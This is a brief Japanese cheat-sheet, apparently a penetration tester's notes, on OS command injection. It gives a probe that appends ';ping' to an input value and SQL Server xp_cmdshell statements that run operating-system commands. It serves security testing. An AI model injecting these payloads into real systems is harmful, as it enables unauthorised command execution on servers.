# OSCommandInjection

## 検証方法

* 入力値のあとに`;ping -c 3 127.0.0.1`を入力して検証

## SQLでOSコマンドを実行

* SQL Server 限定
* カレントディレクトリはcmd.exeがあるディレクトリ

``` SQL
   exec xp_cmdshell 'echo file output test > test.txt'
   --　戻り値が欲しいとき
   exec @result = master..xp_cmdshell 'dir *.exe'
```
